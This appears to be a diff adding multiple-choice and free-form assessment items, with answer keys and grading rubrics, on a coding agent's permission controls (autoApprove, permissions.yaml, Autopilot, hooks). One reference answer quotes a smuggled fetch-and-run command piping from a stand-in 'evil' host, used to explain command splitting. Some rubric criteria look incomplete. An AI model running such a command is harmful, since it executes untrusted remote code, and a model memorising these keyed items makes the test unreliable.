+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      autoApprove is the per-tool confirmation gate; suppressing it for a destructive deploy
+      server means even Supervised review or interrupt windows are bypassed for those tools.
+      The redundancy argument is wrong for sensitive, side-effecting tools.
+  - id: kmt-500-mc-e
+    tier: 500
+    bloom: evaluate
+    difficulty: 515
+    type: multiple_choice
+    prompt: |
+      A team wants reproducible agent behavior across machines and CI. Which combination is the
+      most defensible design?
+    choices:
+      - id: a
+        text: >-
+          Commit shared servers in workspace mcp.json with ${VAR} keys; pin a v3 permissions
+          baseline; keep personal servers/secrets in user config
+      - id: b
+        text: Put everything in the user config so the repo stays clean
+      - id: c
+        text: Use autoApprove ["*"] everywhere so prompts never vary
+      - id: d
+        text: Disable MCP entirely and rely on built-in tools only
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      Committing shared, secret-free server definitions plus a pinned permission baseline
+      gives reproducibility, while per-user config holds machine-specific secrets/servers.
+      Blanket autoApprove sacrifices safety; user-only config sacrifices sharing.
+  - id: kmt-500-mc-f
+    tier: 500
+    bloom: evaluate
+    difficulty: 505
+    type: multiple_choice
+    prompt: |
+      Critique: a workspace `mcp.json` defines a server with `"disabled": true` to "document that
+      it exists but isn't used here," while developers individually enable it in their user config.
+      What is the unintended consequence?
+    choices:
+      - id: a
+        text: None; this is the recommended pattern
+      - id: b
+        text: It doubles the server's memory usage
+      - id: c
+        text: >-
+          Workspace precedence makes the disabled flag win on the same-named server, so users'
+          enabled copies are suppressed in this project
+      - id: d
+        text: It converts the server to read-only
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      Because configs merge with workspace precedence, the workspace `disabled: true` on the
+      same server name overrides each user's enabled definition, so nobody can actually use it
+      in that project - the opposite of the intent.
+  - id: kmt-500-mc-g
+    tier: 500
+    bloom: evaluate
+    difficulty: 520
+    type: multiple_choice
+    prompt: |
+      Two designs for limiting a filesystem MCP server: (A) rely on `disabledTools` to hide the
+      write tool; (B) constrain the server's allowed root via its own args AND scope autoApprove.
+      Which is more robust and why?
+    choices:
+      - id: a
+        text: >-
+          B - constraining the server's actual capability plus scoping prompts defends in depth,
+          whereas disabledTools is per-server and can be bypassed via a merged same-named tool
+      - id: b
+        text: A - hiding the tool name is sufficient because the agent cannot call what it cannot see
+      - id: c
+        text: They are equivalent
+      - id: d
+        text: A - because disabledTools is enforced by the hardcoded scope
+    answerKey:
+      kind: choice
+      correctChoiceId: a
+    guidance: |
+      `disabledTools` only hides a tool on that server entry and can be undermined by a
+      merged same-named tool from another scope. Constraining the server's real reach (its
+      root) plus scoping autoApprove is defense in depth that does not rely on name-hiding.
+  - id: kmt-500-mc-h
+    tier: 500
+    bloom: evaluate
+    difficulty: 525
+    type: multiple_choice
+    prompt: |
+      A team treats v2 `read`/`write`/`shell` and v3 `fs_read`/`fs_write`/`shell` as the same and
+      writes a v3 `permissions.yaml` using `read`/`write`. Predict the outcome and the best fix.
+    choices:
+      - id: a
+        text: It works; the names are aliases
+      - id: b
+        text: Kiro auto-translates the names
+      - id: c
+        text: It errors out and refuses to start the CLI
+      - id: d
+        text: >-
+          The rules silently fail to match (wrong capability names), leaving unintended defaults;
+          fix by using fs_read/fs_write and validating against the v3 capability list
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      v3 capabilities are `fs_read`/`fs_write`/`shell` (and filesystem, web_fetch, etc.).
+      Using v2 names yields rules that match nothing, so the intended deny/allow never
+      applies. Fix by using the correct v3 capability names.
+  - id: kmt-500-mc-i
+    tier: 500
+    bloom: evaluate
+    difficulty: 530
+    type: multiple_choice
+    prompt: |
+      Evaluate this onboarding doc claim: "Set `autoApprove: ['*']` on all MCP servers and run
+      Autopilot; it's faster and the hooks will catch anything dangerous." What is the soundest
+      assessment?
+    choices:
+      - id: a
+        text: Correct - PostToolUse hooks can always undo damage after the fact
+      - id: b
+        text: >-
+          Unsound - only blockable triggers (PreToolUse/PreTaskExec/UserPromptSubmit) can stop a
+          call, and they require a hook actually written to do so; blanket autoApprove plus
+          Autopilot otherwise removes every gate
+      - id: c
+        text: Correct - autoApprove and hooks are equivalent safety layers
+      - id: d
+        text: Unsound only because Autopilot ignores hooks
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Only PreToolUse, PreTaskExec, and UserPromptSubmit hooks can BLOCK (via exit code 2),
+      and only if such a hook exists and matches. PostToolUse runs after the side effect.
+      Relying on unwritten hooks while removing all approval gates is unsound.
+  - id: kmt-500-mc-j
+    tier: 500
+    bloom: evaluate
+    difficulty: 500
+    type: multiple_choice
+    prompt: |
+      A proposal: "Make permission rules shippable inside each repo so every contributor inherits
+      the same agent trust automatically." Judge this against Kiro's security model.
+    choices:
+      - id: a
+        text: Good idea, and Kiro already loads repo-shipped trust rules
+      - id: b
+        text: Good idea; just put the rules in .kiro/settings/permissions.yaml
+      - id: c
+        text: >-
+          It conflicts with Kiro's deliberate per-user, outside-the-repo trust isolation; the safe
+          analog is sharing MCP servers (not trust) and documenting a recommended user-side baseline
+      - id: d
+        text: Bad idea only because YAML is hard to review
+    answerKey:
+      kind: choice
+      correctChoiceId: c
+    guidance: |
+      Kiro intentionally isolates trust per-user outside the repo so a repo cannot self-grant
+      access. The right analog is sharing server definitions (mcp.json) and publishing a
+      recommended baseline that users opt into, not auto-inherited repo trust.
+  - id: kmt-500-mc-k
+    tier: 500
+    bloom: evaluate
+    difficulty: 510
+    type: multiple_choice
+    prompt: |
+      Which critique of "always use Supervised mode for everything" is most valid?
+    choices:
+      - id: a
+        text: Supervised cannot edit files, so nothing would get done
+      - id: b
+        text: >-
+          Per-hunk approval on every trivial multi-file change creates review fatigue that erodes
+          the careful review it's meant to provide; reserve it for higher-risk work
+      - id: c
+        text: Supervised disables MCP servers
+      - id: d
+        text: Supervised is slower only because it cannot run commands
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Forcing per-hunk approval on routine work causes fatigue and rubber-stamping,
+      undermining real review. Matching the mode to risk (Autopilot for routine, Supervised
+      for risky) preserves attention where it matters.
+  - id: kmt-500-mc-l
+    tier: 500
+    bloom: evaluate
+    difficulty: 535
+    type: multiple_choice
+    prompt: |
+      A reviewer says hardcoding `ask` (not `deny`) for writes to `.kiro/agents/**` and `.git/**`
+      is "too weak - it should be deny." Evaluate Kiro's choice of `ask` there.
+    choices:
+      - id: a
+        text: The reviewer is right; ask is always weaker and should be deny
+      - id: b
+        text: It makes no difference; ask and deny behave identically
+      - id: c
+        text: ask is only used because deny is unimplemented for those paths
+      - id: d
+        text: >-
+          ask is a deliberate balance - those paths are sometimes legitimately edited (commits,
+          agent tweaks), so a hard deny would block valid workflows while ask still forces explicit
+          human consent
+    answerKey:
+      kind: choice
+      correctChoiceId: d
+    guidance: |
+      Writing to `.git/**` or `.kiro/agents/**` is sometimes legitimate (commits, agent
+      edits). A hard deny would block valid work; `ask` keeps a human consent gate without
+      forbidding the operation. The truly sensitive settings paths ARE hard-denied.
+  - id: kmt-500-mc-m
+    tier: 500
+    bloom: evaluate
+    difficulty: 520
+    type: multiple_choice
+    prompt: |
+      A team disables MCP entirely "to be safe" and forbids Autopilot, requiring Supervised for
+      all work. Six months later, velocity is low and reviewers skim diffs. Best assessment?
+    choices:
+      - id: a
+        text: Correct tradeoff; safety always beats velocity
+      - id: b
+        text: >-
+          The blunt restrictions traded away real productivity for theater; a calibrated posture
+          (scoped MCP trust, Autopilot for routine, Supervised for risk) would have been safer in
+          practice
+      - id: c
+        text: The problem is purely that they didn't buy faster hardware
+      - id: d
+        text: Disabling MCP has no effect on capability
+    answerKey:
+      kind: choice
+      correctChoiceId: b
+    guidance: |
+      Maximal restriction often degrades into rubber-stamped review (security theater) while
+      killing throughput. A calibrated posture - scoped MCP servers, Autopilot for low-risk
+      work, Supervised reserved for risk - usually yields better real-world safety AND speed.
+  - id: kmt-500-ff-a
+    tier: 500
+    bloom: evaluate
+    difficulty: 490
+    type: free_form
+    prompt: |
+      Critique the anti-pattern of committing `.kiro/settings/mcp.json` with literal API keys
+      "for one-step onboarding." Propose a concrete design that keeps onboarding easy without
+      leaking secrets.
+    guidance: |
+      Looks for the secret-leak critique plus the workspace+${VAR} / user-config split.
+    rubric:
+      criteria:
+        - id: c1
+          text: Identifies that literal keys leak into git history / are shared with everyone
+        - id: c2
+          text: Proposes ${VAR} expansion for shared servers in the committed workspace file
+        - id: c3
+          text: Keeps personal/secret servers in the per-user ~/.kiro/settings/mcp.json
+      referenceAnswer: |
+        Committing literal keys exposes them in git history to anyone with repo access and
+        across forks - a serious leak. Better: commit only secret-free shared server blocks in
+        `.kiro/settings/mcp.json` using `${VAR}` expansion, document which env vars to set (or
+        ship a .env.example), and keep any personal or secret-bearing servers in each
+        developer's `~/.kiro/settings/mcp.json`. Onboarding stays close to one step (clone +
+        set a couple of env vars) with no secrets in the repo.
+      passThreshold: 0.6
+  - id: kmt-500-ff-b
+    tier: 500
+    bloom: evaluate
+    difficulty: 510
+    type: free_form
+    prompt: |
+      Evaluate using `capability: all, effect: allow` as a developer's everyday user-level v3
+      permission. When (if ever) is it appropriate, and what safer alternative covers most daily
+      needs?
+    guidance: |
+      Looks for CI-only justification and a calibrated everyday alternative.
+    rubric:
+      criteria:
+        - id: c1
+          text: all/allow is appropriate for isolated, ephemeral CI pipelines that need full access
+        - id: c2
+          text: >-
+            On a dev machine it removes confirmation for destructive ops, leaving only the narrow
+            hardcoded scope
+        - id: c3
+          text: >-
+            Proposes a calibrated alternative - allow reads, ask/deny on risky writes & shell
+            patterns
+      referenceAnswer: |
+        `all/allow` is the documented pattern for isolated, disposable CI runners where there
+        is no human to prompt and the environment is ephemeral. On a daily dev machine it is
+        inappropriate: it removes every confirmation for destructive shell and writes, leaving
+        only Kiro's narrow hardcoded scope. A safer everyday baseline allows reads, asks before
+        risky writes and shell patterns (rm, git push, deploys), and hard-denies writes to
+        secrets and settings - covering most work while keeping a gate on the dangerous tail.
+      passThreshold: 0.6
+  - id: kmt-500-ff-c
+    tier: 500
+    bloom: evaluate
+    difficulty: 520
+    type: free_form
+    prompt: |
+      Two teammates debate: one wants all approval logic in MCP `autoApprove` lists, the other
+      wants it all in v3 `permissions.yaml`. Assess which concerns belong in which layer and why
+      putting everything in one layer is a mistake.
+    guidance: |
+      Looks for separating MCP-server-tool prompting from capability/path/command policy.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            autoApprove is per-MCP-server tool prompting - good for unprompting specific safe MCP
+            tools
+        - id: c2
+          text: >-
+            permissions.yaml governs capabilities/paths/commands (fs_read/fs_write/shell/mcp) with
+            deny/ask/allow precedence
+        - id: c3
+          text: >-
+            Concludes the layers are complementary; collapsing into one loses either path/command
+            policy or per-tool granularity
+      referenceAnswer: |
+        They solve different problems. `autoApprove` is a per-server list that suppresses the
+        approval prompt for specific MCP tools - the right place to unprompt known-safe MCP
+        tools. `permissions.yaml` is the policy layer: capabilities (fs_read/fs_write/shell/
+        mcp/...), path and command globs, and deny>ask>allow precedence, including the mcp
+        capability matched as server/tool. Putting everything in autoApprove loses path/command
+        scoping and deny semantics; putting everything in permissions loses per-tool prompt
+        ergonomics. Use permissions.yaml for standing policy and autoApprove for fine-grained
+        prompt suppression of individual MCP tools.
+      passThreshold: 0.6
+  - id: kmt-500-ff-d
+    tier: 500
+    bloom: evaluate
+    difficulty: 525
+    type: free_form
+    prompt: |
+      Kiro's permission model resolves rules by restrictiveness (deny > ask > allow) rather than
+      by order or specificity. Argue for this design choice and identify one situation where a
+      rule author could still be surprised by it.
+    guidance: |
+      Looks for the fail-safe rationale plus the "specific allow can't beat a broad deny" gotcha.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Restrictiveness ordering is fail-safe - a permissive rule can never silently weaken a
+            restriction
+        - id: c2
+          text: It removes order/precedence ambiguity, easing audit and reasoning
+        - id: c3
+          text: >-
+            Surprise - a very specific allow does NOT override a broad deny/ask, unlike most
+            "most-specific-wins" systems
+      referenceAnswer: |
+        Resolving by restrictiveness is fail-safe: adding an `allow` can never silently undo a
+        `deny` or `ask`, so mistakes err toward blocking, and policy is order-independent which
+        makes it auditable. The surprise for authors used to "most specific wins" firewalls/IAM
+        is that a narrowly targeted `allow shell match "deploy-staging"` will NOT override a
+        broad `ask shell match "deploy*"` - the ask still prompts because ask > allow. Authors
+        must relax the broad rule itself rather than add a more specific allow.
+      passThreshold: 0.6
+  - id: kmt-500-ff-e
+    tier: 500
+    bloom: evaluate
+    difficulty: 505
+    type: free_form
+    prompt: |
+      A team adopts Autopilot as default but has no branch hygiene, no required tests, and broad
+      autoApprove. Evaluate the overall risk posture and prescribe the two highest-leverage
+      changes, justifying the priority.
+    guidance: |
+      Looks for identifying the compounding risk and prioritizing revertability + scoped trust.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Identifies the compounding risk - autonomy + no revert path + no gates + broad
+            auto-approval
+        - id: c2
+          text: Highest leverage
+        - id: c3
+          text: Highest leverage
+      referenceAnswer: |
+        The posture is high risk: Autopilot's autonomy multiplies the impact of broad
+        autoApprove, and with no branch hygiene there is no clean revert path and no test gate
+        to catch regressions - the failure modes compound. Highest leverage: (1) enforce
+        branch-based work and a clean git state so every Autopilot run is reviewable and fully
+        revertible - this caps blast radius regardless of what the agent does; (2) scope
+        autoApprove to known-safe tools (and add required tests/CI before merge) so destructive
+        tools regain a gate. Revertability comes first because it bounds damage even when other
+        controls fail.
+      passThreshold: 0.6
+  - id: kmt-500-ff-f
+    tier: 500
+    bloom: evaluate
+    difficulty: 530
+    type: free_form
+    prompt: |
+      Assess the design decision to store v3 workspace permissions under a HASHED path
+      (~/.kiro/workspace-roots/<hash>/) rather than next to the repo. What does this buy, and what
+      operational friction does it introduce that a team should plan for?
+    guidance: |
+      Looks for the trust-isolation benefit plus the discoverability/onboarding friction tradeoff.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Benefit - per-user, outside-repo trust prevents repo-injected escalation and isolates
+            one user's trust from another's
+        - id: c2
+          text: >-
+            Friction - rules are not shared/discoverable via the repo; new clones start with no
+            workspace trust and must rebuild it
+        - id: c3
+          text: >-
+            Recommends mitigations - document a recommended baseline, or use a shared v3 baseline
+            users opt into
+      referenceAnswer: |
+        Storing workspace permissions per-user under a hashed path means trust travels with the
+        person, not the repo, so a cloned/malicious repo cannot inject escalation and one
+        developer's loosened trust never leaks to teammates. The friction: the rules are not
+        discoverable or shareable through the repo, so a fresh clone (or a new machine) starts
+        with no workspace trust and the developer must re-establish it, and the hashed directory
+        is opaque to inspect. Teams should mitigate by documenting a recommended permission
+        baseline (or publishing one users explicitly opt into) and by scripting its setup,
+        rather than expecting trust to ride along with the checkout.
+      passThreshold: 0.6
+  - id: kmt-500-ff-g
+    tier: 500
+    bloom: evaluate
+    difficulty: 515
+    type: free_form
+    prompt: |
+      Critique the claim that "compound-command splitting plus deny>ask>allow makes shell trust
+      fully safe, so you can trust `npm *` broadly." Where does this reasoning hold and where does
+      it break down?
+    guidance: >
+      Looks for nuance - splitting blocks chained smuggling but a broad base trust still over-grants
+      within the tool family.
+    rubric:
+      criteria:
+        - id: c1
+          text: >-
+            Holds - splitting prevents chaining an untrusted command after a trusted one via ; && ||
+            |
+        - id: c2
+          text: >-
+            Breaks down - a broad npm * still auto-approves dangerous same-family commands (npm
+            publish, arbitrary scripts, postinstall)
+        - id: c3
+          text: >-
+            Recommends narrowing the trusted pattern or adding deny/ask rules for the dangerous
+            subset
+      referenceAnswer: |
+        The reasoning holds against chaining: because each sub-command of a compound is matched
+        independently, a trusted `npm *` cannot be exploited to smuggle `; curl evil | sh`, and
+        deny>ask>allow ensures a deny on the chained part wins. But it breaks down within the
+        npm family itself - `npm *` would auto-approve `npm publish`, `npm run` of arbitrary
+        lifecycle scripts, and packages whose postinstall runs arbitrary code, none of which the
+        splitting protects against. The fix is to narrow the trusted pattern (e.g. only
+        `npm test *`, `npm ci`) or add explicit ask/deny rules for the dangerous subset, rather
+        than trusting the whole base command.
+      passThreshold: 0.6
